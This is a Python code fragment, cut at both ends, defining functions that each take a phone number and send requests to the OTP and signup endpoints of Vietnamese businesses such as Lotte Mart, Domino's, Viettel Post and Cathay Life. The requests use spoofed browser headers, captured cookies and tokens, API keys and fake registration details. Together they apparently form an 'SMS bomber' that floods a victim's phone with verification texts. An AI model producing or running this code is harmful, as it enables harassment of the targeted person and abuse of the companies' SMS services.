    response = requests.post('https://api.onelife.vn/v1/gateway/', headers=headers, json=json_data)

###########
def shopiness(sdt):
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': '_gcl_au=1.1.856197412.1731082221; _ga=GA1.2.1432699086.1731082222; _gid=GA1.2.1800421608.1731082222; _gat_UA-78703708-2=1; _fbp=fb.1.1731082221983.43885550687782696; _ga_P138SCK22P=GS1.1.1731082221.1.0.1731082225.56.0.0',
        'Origin': 'https://shopiness.vn',
        'Referer': 'https://shopiness.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'action': 'verify-registration-info',
        'phoneNumber': sdt,
        'refCode': '',
    }

    response = requests.post('https://shopiness.vn/ajax/user', cookies=cookies, headers=headers, data=data)

def lottemart(sdt):
    cookies = {
        '__Host-next-auth.csrf-token': 'eded2986a24b7a1408f47a54f3804d6479445c8b95f6d4f6ce26c3c76316dda0%7C006e12644cf58ae0aee4dc0da2a4bf96937b46822863026efcf8250a0d975f8d',
        '__Secure-next-auth.callback-url': 'https%3A%2F%2Fwww.lottemart.vn',
        '_gcl_au': '1.1.1807305139.1731082776',
        '_ga': 'GA1.1.903283512.1731082776',
        '_fbp': 'fb.1.1731082776305.813856318510231224',
        '_ga_6QLJ7DM4XW': 'GS1.1.1731082776.1.1.1731082803.33.0.0',
    }

    headers = {
        'accept': 'application/json',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3',
        'content-type': 'application/json',
        # 'cookie': '__Host-next-auth.csrf-token=eded2986a24b7a1408f47a54f3804d6479445c8b95f6d4f6ce26c3c76316dda0%7C006e12644cf58ae0aee4dc0da2a4bf96937b46822863026efcf8250a0d975f8d; __Secure-next-auth.callback-url=https%3A%2F%2Fwww.lottemart.vn; _gcl_au=1.1.1807305139.1731082776; _ga=GA1.1.903283512.1731082776; _fbp=fb.1.1731082776305.813856318510231224; _ga_6QLJ7DM4XW=GS1.1.1731082776.1.1.1731082803.33.0.0',
        'origin': 'https://www.lottemart.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.lottemart.vn/signup?callbackUrl=https://www.lottemart.vn/vi-vtu',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'x-appcheck-token': 'eyJraWQiOiJRNmZ5eEEiLCJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIxOjcxMjk3MTkwMDMyOTp3ZWI6YzdiZDdmODk3NTY4YWQ5ZjhjMjBiOCIsImF1ZCI6WyJwcm9qZWN0c1wvNzEyOTcxOTAwMzI5IiwicHJvamVjdHNcL2xvdHRlbWFydC0zODMzMTIiXSwicHJvdmlkZXIiOiJyZWNhcHRjaGFfdjMiLCJpc3MiOiJodHRwczpcL1wvZmlyZWJhc2VhcHBjaGVjay5nb29nbGVhcGlzLmNvbVwvNzEyOTcxOTAwMzI5IiwiZXhwIjoxNzMxMTY5MTk1LCJpYXQiOjE3MzEwODI3OTUsImp0aSI6IlpoaUI0cTZwWlFUamRRVmJGTTBnMExMbVlmVzZOVU5BZVhxZmtvZjNXLVEifQ.GaWGBqkA3G3xwn51TEGwcyxcpOobDBOwuxnx7DiN71-lVI7RktUchHNiknW6CDs4KId9bxOnuuYAJlOTzQHIuMP-7dD_jurNjF1fRD8fUxntOOKdTZsYKeVuVEIc6f2iTtlZWkPiq_9ZImBbBAXFh9RGY5MKiOhYI5nY1FogkX7PTquVZLY98FWQvC0b-kAJ3ka8t8Q4etQ7Py4bHJkHU9hRMYdKue7nIF83vdr34pHHZrs7K94KfGaygQq4EO3wCguQZaEFIU8szRPu2A9wB5XXEml3zIe3GQee1Y52sUGEYL_2jm7CvB1OEQNAI5MAHUs_x9tGZokohKE1VQVDoE-Au91EOay88DfNMeXdW1yb57581EMjTh5RnCYgszq1n2UbZkzqE3IcX81akT1sBc3aAlZ3GSw2f8ljr6b3KZdBtqcnlhU5-D62rqtgp69wROdJpqVFzEuffZTY1aQFMLtxLcfpMUMVyM0W7bAuWWMQCUSPLQqZJjpx4r6hfCrM',
    }

    json_data = {
        'username': sdt,
        'case': 'register',
    }

    response = requests.post(
        'https://www.lottemart.vn/v1/p/mart/bos/vi_vtu/V1/mart-sms/sendotp',
        cookies=cookies,
        headers=headers,
        json=json_data,
    )

def dominos(sdt):
    cookies = {
        '_ga_8GXKYDTW3R': 'GS1.1.1731082948.1.0.1731082948.0.0.0',
        '_ga_12HB7KTL5M': 'GS1.1.1731082948.1.1.1731082948.60.0.0',
        '_ga': 'GA1.2.906823934.1731082949',
        '_gid': 'GA1.2.1483757760.1731082949',
        '_fbp': 'fb.1.1731082949531.507096953775795147',
    }

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        # 'cookie': '_ga_8GXKYDTW3R=GS1.1.1731082948.1.0.1731082948.0.0.0; _ga_12HB7KTL5M=GS1.1.1731082948.1.1.1731082948.60.0.0; _ga=GA1.2.906823934.1731082949; _gid=GA1.2.1483757760.1731082949; _fbp=fb.1.1731082949531.507096953775795147',
        'dmn': 'DUPJFT',
        'origin': 'https://dominos.vn',
        'priority': 'u=1, i',
        'referer': 'https://dominos.vn/',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'secret': 'bPG0upAJLk0gz/2W1baS2Q==',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
    }

    json_data = {
        'phone_number': sdt,
        'email': 'pologhj9adad@gmail.com',
        'type': 0,
        'is_register': True,
    }

    response = requests.post('https://dominos.vn/api/v1/users/send-otp', cookies=cookies, headers=headers, json=json_data)


def circa(sdt):
    cookies = {
        'session_medship': 'c2lnPWZkZmM2YTQ2OGUzZmJkMGExYjg0ZmM4YWNjZWU1ZDFmNWM1Y2RjOGIxNWYwYWY4OTlmYjIzYzM3ZTViNDQxMTEmdHM9MTczMTA4MzIyNiZpZD1iODQxMTRkNS1lOTgyLTQyMzMtYWNmMy04NjM0ZDliYzY2ZDQ=',
        '_ga': 'GA1.1.185789079.1731083226',
        '_ga_697S6GJCRP': 'GS1.1.1731083225.1.0.1731083233.0.0.0',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3',
        'authorization': 'Basic YnV5bWVkLmNvbS5jaXJjYS1vbmxpbmUuZ3Vlc3Q6ZXlKMGVYQmxJam9pWVdOalpYTnpYM1J2YTJWdUlpd2lhWE56SWpvaVFuVjViV1ZrTFVGUUlpd2lkRzlyWlc0aU9pSjNSWGh5TWxCb1VIWmlabWxhWjI1eVVEUnVWbEJtVVhaT1ZYQTBRVkZ6Vm5kbmExQXpSRzFKWVZWS1l6aGlaRVFpTENKamJHbGxiblFpT2lJM1ZEWjNhR2w2T1hWc2RGbGxaMGRNWVd0TlNVazNOV0o2Y1RKSGR6TlRaalYyUkVRNE9XZHNPR05KTlRjMVpIRWlmUW89',
        'content-type': 'application/json',
        # 'cookie': 'session_medship=c2lnPWZkZmM2YTQ2OGUzZmJkMGExYjg0ZmM4YWNjZWU1ZDFmNWM1Y2RjOGIxNWYwYWY4OTlmYjIzYzM3ZTViNDQxMTEmdHM9MTczMTA4MzIyNiZpZD1iODQxMTRkNS1lOTgyLTQyMzMtYWNmMy04NjM0ZDliYzY2ZDQ=; _ga=GA1.1.185789079.1731083226; _ga_697S6GJCRP=GS1.1.1731083225.1.0.1731083233.0.0.0',
        'origin': 'https://circa.vn',
        'priority': 'u=1, i',
        'referer': 'https://circa.vn/',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
    }

    json_data = {
        'phoneNumber': sdt,
    }

    response = requests.post(
    'https://circa.vn/backend/circa-online/consumer/v1/verify-phone-number',
    cookies=cookies,
    headers=headers,
    json=json_data,
)
#####
def fmplus(sdt):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3',
        'authorization': 'Bearer',
        'content-type': 'application/json;charset=UTF-8',
        'origin': 'https://fm.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://fm.com.vn/',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'x-apikey': 'X2geZ7rDEDI73K1vqwEGStqGtR90JNJ0K4sQHIrbUI3YISlv',
        'x-emp': '',
        'x-fromweb': 'true',
        'x-requestid': '2aa72354-69e8-41bd-8aaa-835fc70b1445',
    }

    json_data = {
        'Phone': sdt,
        'LatOfMap': '106',
        'LongOfMap': '108',
        'Browser': '',
        'Token': '03AFcWeA6nZyVdhZC8fExKwWfOvoCnT7fRgsYOeqcDrhY98tAM9A_5M4Rhx6iI6eF9dWGTbn06RCC7MdKwX7UuTR_0yljpMGQtGEghkTgtI8Kz1iY6ZssFytHM4nVZfeGC8n2efrMEEsJjeP0BB5p22lcOOxEp6xRaa0dclMbHRARsnO1gUxtJCMq8VnTTywSixKWii9r9htthN7fusybgFEUhES6xe1pWua9ooVVgTS6qkID1VZoN1UjX4EoUhTAAA7-CpohAArv5q3zga68e8pGE3a3c0Oh3KXYw63ZxCYicHaI9pHFvr8U0kP44gH37l5XtnzY5MguuLC2bqIL0iq_QbGKLPBROLJfM5RGvqFwyWIq81-LBUzgcwHKnMickN4p0xAOVBY5Ro6gobLpbjyIMK4Txw1bQfZ1nJlAJJNGxCQ2A3lTi27fsbHvveAX5Pgnrdsy1NH178Noz0VX4GDUMypt_ccKYKF-y3ieNjNkndEfCh_R5LfvrBSux9XR_hpM8mj0SaoN7aB72sCGOsEt7EQnrYR1-Lknm5l3GEKpdzVYs9o5tjVQW31F47MTSc-R5xoTp6-9TCZX-2CDMEXe1UzC4BBLpM_4q-gBlbVTRk3JAJSJ2E3EJQARGrMuJZ1TEPBJigpIsiJJ7Jwr4-ETYKNn2hH2ulQWzv__Ptkb5OgQ1CewS1_95fdTAbDkZgzK1d8u5adMLMwe1ovMBrFxsI1THIb72ZZ0eEJhAHdAvJfwTQEliARkRiAl-aXqajx8Sxfyp83cu_f4Vm1BdvXbdUh10hmHPLgEYkHMEPBCEmSbEYVsMFxZ0BaV2LJvyQqAvwIPFDZehICUeHsmc_cbDNQNHXAW7-L4b6Brrr8dF-bRKPjj7e0XPZM7Z4pWXIYSvZ8OKUxa5B5IbnGSIqxDLqZ_Boow4TNu7b1lKTKCEGF8YoO5YhYH7LHMgxyvaw3RedGJjtX7pAabPgK80ysx7ks2rilAOcG0RExG02HNpcyFQVf4ErZh6nNtxk4qMSO6epGC50xjBb_y9fB7hgXwskX_xkX4wL1k6r3Lyy3XvjGv5oQm2XsiuM24QLmFxgvHqJoMbyAe0Sl6_1UeRj13HKYAc7HhH1IWeB5Bd8htfZ2WcAO-rZUj8i2MBHEKpurLmWAyDQbd6gAQyC8C-GHiTOu0awkzIhk4SaFyQngpqyASSt7ta2UqkoxLawJsQfB3o1Ee1NDNeCtlLHmYeWoXMGFy3tEh7fQRAnRgfte9afzhmoHehe-tZQY_me4akTg9xUTwtDNV6RM9OkJmdJox4Vvqikw1s3EN7kdfpn4FgCveCjgqyTv1FMhMLDi7hdmgo4ROksDl8WtfBNLq-yg3rjpDZAlBcstS32JMqkBKNDoa9f---lk1hDF8-ZO5R9F3FuFbAnTSk0oB0WKcRCYqV-FEhFPvMTtRpvJxIsS6nOFpmPrVgL5F2rZz7aIZzPSq9r78cRLixIVe2Tck87nyKNfdjubp0sGHG62bCp0ktd2yvTYzC5HfLrDQVa6_fN6TSwh1-XI-fQoxr185zT9KyFslpxjj7RYWRMipEIjdnQhCz-b6Dzlgo9VYHHsLP9C8XS0lwkew-uhdGY54CMa0442Z1ZxbM5XfGdLlt-8lScmaW_6LYYRHADtw8YFggOZ2zZuS4DufxCsEQ7zGdqrqPx4_m9-xsC7yxHLvZKcKsr6Gv3QOSC_v32DXp6hC4PiXD-Gwy-e_aP3cWTdRXAEJ40sifxccF6YACijMLyVRPYHADoT4tjyhNutNI4B-XeU6xkAuHDHhhFSXaRNa4crXTInHtGf4asBvcnXDpz7HBEKEICPudnSeEBDyHZdw14Ex3j3OnCaLKuLW0qzaSc-AObvpom6Y8CYLpTw2lN4Qf4dyXNg6z0YJbIKoGsubckRb-4a_766nF9aQhAWwD_N0cfh54Hj6CpZbL8mEe5vI1APPHUtiezjG9mSFKvlVLK5vlIxP6eyXr',
    }

    response = requests.post('https://api.fmplus.com.vn/api/1.0/auth/verify/send-otp-v2', headers=headers, json=json_data)

def viettelpost(sdt):
    cookies = {
    '_gid': 'GA1.2.620335128.1720627303',
    '_gat_gtag_UA_128396571_2': '1',
    'QUIZIZZ_WS_COOKIE': 'id_192.168.12.141_15001',
    '.AspNetCore.Antiforgery.XvyenbqPRmk': 'CfDJ8ASZJlA33dJMoWx8wnezdv_KN5bT4QKXiMPZaUMqRiF_EEbvz-ub2OfOxFsWqfP5oyWQZfbAj-YmrKoW5q2we2B85fBpeffjr6w1vgncGlK11bclPhcrNb-yY6eMuSkQFZ887kHXkBgVaHZVnb06mjY',
    '_ga_9NGCREH08E': 'GS1.1.1720627303.1.0.1720627304.59.0.0',
    '_gat_gtag_UA_146347905_1': '1',
    '_gat_gtag_UA_142538724_1': '1',
    '_ga_7RZCEBC0S6': 'GS1.1.1720627304.1.1.1720627306.0.0.0',
    '_ga_WN26X24M50': 'GS1.1.1720627305.1.1.1720627306.0.0.0',
    '_ga': 'GA1.1.278441667.1720627303',
    '_ga_P86KBF64TN': 'GS1.1.1720627305.1.1.1720627319.0.0.0',
    }
    
    headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
    # 'Cookie': '_gid=GA1.2.620335128.1720627303; _gat_gtag_UA_128396571_2=1; QUIZIZZ_WS_COOKIE=id_192.168.12.141_15001; .AspNetCore.Antiforgery.XvyenbqPRmk=CfDJ8ASZJlA33dJMoWx8wnezdv_KN5bT4QKXiMPZaUMqRiF_EEbvz-ub2OfOxFsWqfP5oyWQZfbAj-YmrKoW5q2we2B85fBpeffjr6w1vgncGlK11bclPhcrNb-yY6eMuSkQFZ887kHXkBgVaHZVnb06mjY; _ga_9NGCREH08E=GS1.1.1720627303.1.0.1720627304.59.0.0; _gat_gtag_UA_146347905_1=1; _gat_gtag_UA_142538724_1=1; _ga_7RZCEBC0S6=GS1.1.1720627304.1.1.1720627306.0.0.0; _ga_WN26X24M50=GS1.1.1720627305.1.1.1720627306.0.0.0; _ga=GA1.1.278441667.1720627303; _ga_P86KBF64TN=GS1.1.1720627305.1.1.1720627319.0.0.0',
    'Origin': 'null',
    'Pragma': 'no-cache',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    }
    data = {
    'FormRegister.FullName': 'Taylor Jasmine',
    'FormRegister.Phone': sdt,
    'FormRegister.Password': 'vjyy1234',
    'FormRegister.ConfirmPassword': 'vjyy1234',
    'ReturnUrl': '/connect/authorize/callback?client_id=vtp.web&secret=vtp-web&scope=openid%20profile%20se-public-api%20offline_access&response_type=id_token%20token&state=abc&redirect_uri=https%3A%2F%2Fviettelpost.vn%2Fstart%2Flogin&nonce=s7oqj3gkapi06ddxfymrhcs',
    'ConfirmOtpType': 'Register',
    'FormRegister.IsRegisterFromPhone': 'true',
    '__RequestVerificationToken': 'CfDJ8ASZJlA33dJMoWx8wnezdv8MNiql6Angxj2aQkKc6E7R0IbTO0WlQgNkTmu1FXJfLeYLf3huG-7Bwm56zhIf_24enfQeQw_ZU0U3j7lUGSruoA3rf6J9q21R09mQjT1SH5SlPYbamWpErWJe9T5YsuQ',
    }
    
    response = requests.post('https://id.viettelpost.vn/Account/SendOTPByPhone', cookies=cookies, headers=headers, data=data)
def shine30(sdt):
    headers = {
    'accept': 'application/json',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'authorization': '',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://30shine.com',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://30shine.com/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }

    json_data = {
    'phone': sdt,
    }

    response = requests.post(
    'https://ls6trhs5kh.execute-api.ap-southeast-1.amazonaws.com/Prod/otp/send',
    headers=headers,
    json=json_data,
    )

def cathaylife(sdt):
    cookies = {
        'JSESSIONID': 'YVRUmDZFYKjTzQccKfrr+TPN.06283f0e-f7d1-36ef-bc27-6779aba32e74',
        'TS01f67c5d': '0110512fd7359b305b05261dc751db97945ab84269f798c45066769bcb4563d8164015ea090394ec73075d3ca432445edf8fa17d22',
        'BIGipServerB2C_http': '!xvdNZLbIoddg4F7RrhDcHTnwa9KJ8ckaQNnv8CXfvNmU+GdppRdnXvkNs87U+frrAN+op95/N7iI',
        'TS0173f952': '0110512fd7359b305b05261dc751db97945ab84269f798c45066769bcb4563d8164015ea090394ec73075d3ca432445edf8fa17d22',
        '_ga_M0ZP5CJBQZ': 'GS1.1.1731142386.1.0.1731142386.0.0.0',
        '_ga': 'GA1.3.1461221820.1731142386',
        '_gid': 'GA1.3.2021355346.1731142387',
        'dtCookies05g7k3y': 'v_4_srv_1_sn_CB774F0FB9289593C5B647A60833539D_perc_100000_ol_0_mul_1_app-3Aea7c4b59f27d43eb_1',
        'rxVisitors05g7k3y': '1731142387597K3830MLK9216CFLSGFMM42VHQ3AJUIPH',
        'dtSas05g7k3y': '-',
        'INITSESSIONID': '82e2b5d057674834c12185454d361ee2',
        'rxvts05g7k3y': '1731144293712|1731142387599',
        'dtPCs05g7k3y': '1$142387594_142h-vFTPVAUJSBLCFNACPUKTLTAHBGFPIDVTL-0e0',
    }
    
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
        # 'Cookie': 'JSESSIONID=YVRUmDZFYKjTzQccKfrr+TPN.06283f0e-f7d1-36ef-bc27-6779aba32e74; TS01f67c5d=0110512fd7359b305b05261dc751db97945ab84269f798c45066769bcb4563d8164015ea090394ec73075d3ca432445edf8fa17d22; BIGipServerB2C_http=!xvdNZLbIoddg4F7RrhDcHTnwa9KJ8ckaQNnv8CXfvNmU+GdppRdnXvkNs87U+frrAN+op95/N7iI; TS0173f952=0110512fd7359b305b05261dc751db97945ab84269f798c45066769bcb4563d8164015ea090394ec73075d3ca432445edf8fa17d22; _ga_M0ZP5CJBQZ=GS1.1.1731142386.1.0.1731142386.0.0.0; _ga=GA1.3.1461221820.1731142386; _gid=GA1.3.2021355346.1731142387; dtCookies05g7k3y=v_4_srv_1_sn_CB774F0FB9289593C5B647A60833539D_perc_100000_ol_0_mul_1_app-3Aea7c4b59f27d43eb_1; rxVisitors05g7k3y=1731142387597K3830MLK9216CFLSGFMM42VHQ3AJUIPH; dtSas05g7k3y=-; INITSESSIONID=82e2b5d057674834c12185454d361ee2; rxvts05g7k3y=1731144293712|1731142387599; dtPCs05g7k3y=1$142387594_142h-vFTPVAUJSBLCFNACPUKTLTAHBGFPIDVTL-0e0',
        'Origin': 'https://www.cathaylife.com.vn',
        'Referer': 'https://www.cathaylife.com.vn/CPWeb/portal/register',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }
    
    data = {
        'phone': sdt,
        'email': 'philongsybsbgp4pzov0r6et6@hotmail.com',
        'LINK_FROM': 'signUp2',
        'CUSTOMER_NAME': 'Đặng Văn Quý',
        'memberID': '',
        'POL_HOLDER_NUM': 'undefined',
        'LANGS': 'vi_VN',
    }
    
    response = requests.post(
        'https://www.cathaylife.com.vn/CPWeb/servlet/HttpDispatcher/CPZ1_0110/sendOTP',
        cookies=cookies,
        headers=headers,
        data=data,
    )

def mocha(sdt):
    headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    # 'Content-Length': '0',
    'Origin': 'https://video.mocha.com.vn',
    'Pragma': 'no-cache',
    'Referer': 'https://video.mocha.com.vn/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    params = {
    'msisdn': sdt,
    'languageCode': 'vi',
}

    response = requests.post('https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp', params=params, headers=headers)

def modcha35(sdt):

    url = "https://v2sslapimocha35.mocha.com.vn/ReengBackendBiz/genotp/v32"

    payload = f"clientType=ios&countryCode=VN&device=iPhone15%2C3&os_version=iOS_17.0.2&platform=ios&revision=11224&username={sdt}&version=1.28"

    headers = {
    'User-Agent': "mocha/1.28 (iPhone; iOS 17.0.2; Scale/3.00)",
    'Content-Type': "application/x-www-form-urlencoded",
    'uuid': "B4DD9661-2B0B-418F-B953-6AE71C0373EC",
    'APPNAME': "MC35",
    'mocha-api': "",
    'countryCode': "VN",
    'languageCode': "vi",
    'Accept-Language': "vi-VN;q=1"
    }

    response = requests.post(url, data=payload, headers=headers)

def bestinc(sdt):
    headers = {
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Connection': 'keep-alive',
    'Origin': 'https://www.best-inc.vn',
    'Referer': 'https://www.best-inc.vn/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'cross-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
    'accept': 'application/json',
    'authorization': 'null',
    'content-type': 'application/json',
    'lang-type': 'vi-VN',
    'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'x-auth-type': 'WEB',
    'x-lan': 'VI',
    'x-nat': 'vi-VN',
    'x-timezone-offset': '7',
}

    json_data = {
    'phoneNumber': sdt,
    'verificationCodeType': 1,
}

    response = requests.post('https://v9-cc.800best.com/uc/account/sendsignupcode', headers=headers, json=json_data)

def lote(sdt):
    cookies = {
    '__Host-next-auth.csrf-token': '2c95aedbe3b2a7070c6b91899b2ae8c85931edffbc5f53bf3ceaa177f1a204be%7C5b2082aa598f7c2d9802014b5fabfcd523af03e4738af10baf6ca96063c440b6',
    '__Secure-next-auth.callback-url': 'https%3A%2F%2Fwww.lottemart.vn',
    '_gcl_au': '1.1.2136712951.1720299022',
    '_ga': 'GA1.1.164372556.1720299023',
    '_fbp': 'fb.1.1720299024438.549668172235070425',
    '_ga_6QLJ7DM4XW': 'GS1.1.1720299022.1.1.1720299051.31.0.0',
}

    headers = {
    'accept': 'application/json',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    # 'cookie': '__Host-next-auth.csrf-token=2c95aedbe3b2a7070c6b91899b2ae8c85931edffbc5f53bf3ceaa177f1a204be%7C5b2082aa598f7c2d9802014b5fabfcd523af03e4738af10baf6ca96063c440b6; __Secure-next-auth.callback-url=https%3A%2F%2Fwww.lottemart.vn; _gcl_au=1.1.2136712951.1720299022; _ga=GA1.1.164372556.1720299023; _fbp=fb.1.1720299024438.549668172235070425; _ga_6QLJ7DM4XW=GS1.1.1720299022.1.1.1720299051.31.0.0',
    'origin': 'https://www.lottemart.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://www.lottemart.vn/signup?callbackUrl=https://www.lottemart.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'username': sdt,
    'mobile': sdt,
    'case': 'register',
}

    response = requests.post(
    'https://www.lottemart.vn/v1/p/mart/bos/vi_nsg/V1/mart-sms/sendotp',
    cookies=cookies,
    headers=headers,
    json=json_data,
)

def ahamove(sdt):
    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/json;charset=UTF-8',
    'origin': 'https://app.ahamove.com',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://app.ahamove.com/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
